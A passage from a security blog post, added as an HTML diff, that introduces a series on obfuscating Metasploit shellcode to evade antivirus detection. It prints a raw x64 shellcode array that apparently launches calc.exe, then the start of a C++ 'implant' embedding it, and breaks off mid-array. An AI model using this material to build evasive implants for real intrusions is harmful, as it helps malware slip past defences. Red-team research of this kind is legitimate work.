@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+
+
+    
+
+<html lang="en-us" data-theme="dark">
+<head>
+    
+        
+<meta charset="utf-8">
+<meta name="HandheldFriendly" content="True">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+<title>A Study In Obfuscation - bl0g</title>
+
+<meta name="description" content="Introduction In this blog series, we explore how to obfuscate a Metasploit payload to avoid detection by Antivirus Engines and shall try to go invisible. We would start from the ground up: Using a completely unobfuscated shellcode, and try to build upon it till we reach zero detections. All the associated code for this blog can be found in this Github repository.
+We would employ known techniques and see how they affect detection rates uploading the compiled executable to AntiScan as it does not submit the samples to the vendors.">
+
+
+
+
+
+<link rel="icon" type="image/x-icon" href="https://whokilleddb.github.io/blogs/favicon.ico">
+<link rel="apple-touch-icon-precomposed" href="https://whokilleddb.github.io/blogs/favicon.png">
+
+
+<style>
+  body {
+    visibility: hidden;
+    opacity: 0;
+  }
+</style>
+
+<noscript>
+  <style>
+    body {
+      visibility: visible;
+      opacity: 1;
+    }
+  </style>
+</noscript>
+
+
+
+    
+
+
+
+
+
+    
+    
+        
+    
+    
+
+    
+        <link rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/style.min.8ae46a41295e148d0bcce914795c26e3e5d1bed4c4e883eb30e82d224c152218.css" integrity="sha256-iuRqQSleFI0LzOkUeVwm4&#43;XRvtTE6IPrMOgtIkwVIhg=">
+    
+
+
+
+
+
+    
+
+    
+
+
+
+
+
+    
+    
+        
+    
+    
+
+    
+        <script src="https://whokilleddb.github.io/blogs/js/script.min.74bf1a3fcf1af396efa4acf3e660e876b61a2153ab9cbe1893ac24ea6d4f94ee.js" type="text/javascript" charset="utf-8" integrity="sha256-dL8aP88a85bvpKzz5mDodrYaIVOrnL4Yk6wk6m1PlO4="></script>
+    
+
+
+
+
+
+
+
+<meta property="og:title" content="A Study In Obfuscation" />
+<meta property="og:description" content="Introduction In this blog series, we explore how to obfuscate a Metasploit payload to avoid detection by Antivirus Engines and shall try to go invisible. We would start from the ground up: Using a completely unobfuscated shellcode, and try to build upon it till we reach zero detections. All the associated code for this blog can be found in this Github repository.
+We would employ known techniques and see how they affect detection rates uploading the compiled executable to AntiScan as it does not submit the samples to the vendors." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://whokilleddb.github.io/blogs/posts/a_study_in_obfuscation/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-20T15:18:00+05:30" />
+<meta property="article:modified_time" content="2022-08-20T15:18:00+05:30" />
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="A Study In Obfuscation"/>
+<meta name="twitter:description" content="Introduction In this blog series, we explore how to obfuscate a Metasploit payload to avoid detection by Antivirus Engines and shall try to go invisible. We would start from the ground up: Using a completely unobfuscated shellcode, and try to build upon it till we reach zero detections. All the associated code for this blog can be found in this Github repository.
+We would employ known techniques and see how they affect detection rates uploading the compiled executable to AntiScan as it does not submit the samples to the vendors."/>
+
+
+
+
+
+
+
+
+
+
+
+    
+</head>
+<body>
+    <a class="skip-main" href="#main">Skip to main content</a>
+    <div class="container">
+        <header class="common-header"> 
+            
+                <div class="header-top">
+    <h1 class="site-title">
+    <a href="/blogs">bl0g</a>
+</h1>
+    <ul class="social-icons">
+
+
+    
+        
+        
+        <li>
+            <a href="https://github.com/whokilleddb" title="Github" rel="me">
+            <span class="inline-svg" >
+
+
+
+
+    
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+</span>
+
+            </a>
+        </li>
+    
+
+    
+        
+        
+        <li>
+            <a href="https://twitter.com/whokilleddb" title="Twitter" rel="me">
+            <span class="inline-svg" >
+
+
+
+
+    
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+</span>
+
+            </a>
+        </li>
+    
+
+    
+        
+        
+        <li>
+            <a href="https://www.linkedin.com/in/whokilleddb" title="Linkedin" rel="me">
+            <span class="inline-svg" >
+
+
+
+
+    
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+</span>
+
+            </a>
+        </li>
+    
+
+
+
+
+</ul>
+</div>
+
+    <nav></nav>
+
+
+
+
+            
+        </header>
+        <main id="main" tabindex="-1"> 
+            
+    
+
+    <article class="post h-entry">
+        <div class="post-header">
+            <header>
+                <h1 class="p-name post-title">A Study In Obfuscation</h1>
+
+                
+            </header>
+        </div>
+        <div class="content e-content">
+            <h1 id="introduction" >Introduction
+<span>
+    <a href="#introduction">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h1><p>In this blog series, we explore how to obfuscate a Metasploit payload to avoid detection by Antivirus Engines and shall try to go invisible. We would start from the ground up: Using a completely unobfuscated shellcode, and try to build upon it till we reach zero detections. All the associated  code for this blog can be found <a href="https://github.com/whokilleddb/A-Study-in-Obfuscation/">in this Github repository</a>.</p>
+<p>We would employ known techniques and see how they affect detection rates uploading the compiled executable to <a href="https://antiscan.me/">AntiScan</a> as it does not submit the samples to the vendors.</p>
+<p><img src="https://c.tenor.com/ZmZ7UKIc0soAAAAC/anonymous-anonymous-bites-back.gif" alt="Pepe"></p>
+<h2 id="environment-setup" >Environment Setup
+<span>
+    <a href="#environment-setup">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>To begin with, we would be needing some tools and setup to get started. The first thing is the unobfuscated shellcode we&rsquo;ll be using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>RAW_PAYLOAD <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
+</span></span><span style="display:flex;"><span>    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
+</span></span><span style="display:flex;"><span>    0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 
+</span></span><span style="display:flex;"><span>    0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 
+</span></span><span style="display:flex;"><span>    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 
+</span></span><span style="display:flex;"><span>    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 
+</span></span><span style="display:flex;"><span>    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 
+</span></span><span style="display:flex;"><span>    0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 
+</span></span><span style="display:flex;"><span>    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 
+</span></span><span style="display:flex;"><span>    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 
+</span></span><span style="display:flex;"><span>    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 
+</span></span><span style="display:flex;"><span>    0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 
+</span></span><span style="display:flex;"><span>    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 
+</span></span><span style="display:flex;"><span>    0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 
+</span></span><span style="display:flex;"><span>    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 
+</span></span><span style="display:flex;"><span>    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 
+</span></span><span style="display:flex;"><span>    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 
+</span></span><span style="display:flex;"><span>    0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 
+</span></span><span style="display:flex;"><span>    0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 
+</span></span><span style="display:flex;"><span>    0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 
+</span></span><span style="display:flex;"><span>    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 
+</span></span><span style="display:flex;"><span>    0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 
+</span></span><span style="display:flex;"><span>    0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+</span></span><span style="display:flex;"><span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>This will be our base from where we start. The raw, untampered shellcode is placed in <code>scripts/obfuscator.py</code>. The python file describes a class <code>Obfuscator</code> which takes our shell code and obfuscates it to various levels which is used as the payload in <code>implant.cpp</code></p>
+<p>Next up, we need to set up our development environment. For this, we need to install <a href="https://visualstudio.microsoft.com/vs/features/cplusplus/">Visual Studio&rsquo;s C/C++ Development Tools</a>.</p>
+<p>Once that is done, we can bring up any IDE of our choice and jump straight to coding. However, if you are using Visual Studio Code, I highly recommend having <code>x64 Native Tools Command Prompt</code> as your default. One way of doing is to add the full path to <code>VsDevCmd.bat</code> to  VS Code&rsquo;s <code>settings.json</code> file as such:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;workbench.colorTheme&#34;</span>: <span style="color:#e6db74">&#34;Default Dark+&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;terminal.integrated.shell.windows&#34;</span>: <span style="color:#e6db74">&#34;cmd.exe&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;terminal.integrated.shellArgs.windows&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;/k&#34;</span>, <span style="color:#e6db74">&#34;C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat&#34;</span>, <span style="color:#e6db74">&#34;x64&#34;</span>
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;terminal.integrated.automationShell.windows&#34;</span>: <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;explorer.confirmDelete&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="level-0---the-raw-shell-code" >Level 0 - The Raw Shell Code
+<span>
+    <a href="#level-0---the-raw-shell-code">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>To begin with, we write a program to execute our shell code with the help of a program as such:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">/// Compile With:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:executables\level0.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Payload String - Level0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> payload[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x51</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x72</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x8b</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xf1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x0c</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x59</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0x8d</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd5</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0xff</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xfb</span>, <span style="color:#ae81ff">0xe0</span>,
